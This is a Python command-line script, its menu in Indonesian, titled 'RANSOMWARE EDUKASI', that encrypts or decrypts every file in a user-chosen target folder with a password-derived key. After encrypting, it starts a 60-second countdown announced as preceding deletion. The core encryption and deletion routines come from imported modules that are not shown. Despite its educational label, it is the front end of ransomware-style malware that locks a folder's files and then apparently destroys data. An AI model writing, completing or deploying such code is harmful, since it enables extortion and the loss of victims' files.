import os
import hashlib
from encryptor import *
from timer import start_timer
from cryptography.fernet import Fernet

def clear_screen():
    os.system("clear" if os.name == "posix" else "cls")

def menu():
    clear_screen()
    print("="*50)
    print("📁  RANSOMWARE EDUKASI - CLI VERSION")
    print("="*50)
    print("[1] 🔐 Enkripsi Folder")
    print("[2] 🔓 Dekripsi Folder")
    print("[3] ❌ Keluar")
    print("="*50)

def get_input():
    password = input("🔑 Masukkan Password: ")
    folder = input("📁 Masukkan Path Folder Target: ")
    return password, folder

def main():
    while True:
        menu()
        choice = input("Pilih opsi (1/2/3): ").strip()
        if choice == "1":
            password, folder = get_input()
            key = generate_key(password)
            files = get_all_files(folder)
            for f in files:
                if encrypt_file(f, key):
                    print(f"✅ Enkripsi: {f}")
            print("🕒 Timer 60 detik sebelum penghapusan...")
            start_timer(60, folder, print)
            input("Tekan ENTER untuk kembali ke menu...")
        elif choice == "2":
            password, folder = get_input()
            key = generate_key(password)
            files = get_all_files(folder)
            for f in files:
                if decrypt_file(f, key):
                    print(f"✅ Dekripsi: {f}")
            input("Tekan ENTER untuk kembali ke menu...")
        elif choice == "3":
            print("👋 Keluar...")
            break
        else:
            print("⚠️ Opsi tidak valid.")
            input("Tekan ENTER untuk kembali...")

if __name__ == "__main__":
    main()
